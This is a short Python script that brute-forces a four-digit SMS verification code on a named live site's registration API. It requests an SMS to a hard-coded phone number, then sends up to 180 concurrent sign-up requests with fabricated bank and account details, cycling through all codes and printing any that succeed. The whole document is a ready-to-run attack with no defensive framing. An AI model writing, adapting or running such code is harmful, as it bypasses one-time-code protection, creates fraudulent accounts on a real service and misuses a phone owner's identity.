import asyncio, httpx, json, random, time
BASE="https://ofa1777.ofa377.net/api"
H={"Content-Type":"application/json","Origin":"https://ofa1777.ofa377.net","Referer":"https://ofa1777.ofa377.net/"}
async def main():
    P="886933333001"
    async with httpx.AsyncClient(verify=False,timeout=25,limits=httpx.Limits(max_connections=200,max_keepalive_connections=200)) as c:
        await c.post(BASE+"/v2/sms/send",data=json.dumps({"phone_number":P}),headers=H)
        codes=[str(x) for x in range(1000,10000)]+[str(x).zfill(4) for x in range(0,10000)]
        random.shuffle(codes)
        t0=time.time(); done=0
        sem=asyncio.Semaphore(180)
        async def one(code):
            nonlocal done
            async with sem:
                d={"bank_account":"1","bank_code":"CMB","bank_currency":"TWD","bank_name":"T","email":"e%d@x.com"%random.randint(1,10**9),"line":"l","name":"T","password":"Passw0rd!123","phone_number":P,"refer_code":"","username":"u%d"%random.randint(10**6,10**7),"verify_code":code}
                rr=await c.post(BASE+"/v2/register/",data=json.dumps(d),headers=H)
                b=rr.json()
                done+=1
                if b.get("code") in (200,201) or b.get("error_code")!="4405":
                    print("HIT",code,rr.status_code,json.dumps(b)[:500],flush=True)
        tasks=[asyncio.create_task(one(x)) for x in codes]
        for t in asyncio.as_completed(tasks):
            await t
            if done and done%5000==0:
                print("prog",done,"%.0fs"%(time.time()-t0),flush=True)
        print("DONE4 total",len(codes),"elapsed %.1fs"%(time.time()-t0),"done",done,flush=True)
asyncio.run(main())
